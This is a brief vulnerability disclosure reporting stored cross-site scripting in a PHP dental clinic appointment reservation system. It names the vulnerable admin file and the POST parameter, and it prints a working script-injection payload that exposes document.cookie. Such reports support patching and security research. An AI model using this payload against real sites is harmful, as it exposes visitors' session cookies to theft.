# Dental Clinic Appointment Reservation System v1.0 has stored cross-site scripting

BUG_Author: DaXian.Li

Website source code address: https://www.sourcecodester.com/php/6848/appointment-reservation-system.html

Vulnerability File: /APR/admin/service.php

POST parameter "service" exists stored cross-site scripting vulnerability

Payload: id=1&service=<script>alert(document.cookie)</script>&price=700.00&edit=

![image](https://github.com/daxian2022/CVE/blob/main/xss.png)

Payload will trigger when a user visits on http://localhost/APR/admin/service.php

![image](https://github.com/daxian2022/CVE/blob/main/xss1.png)
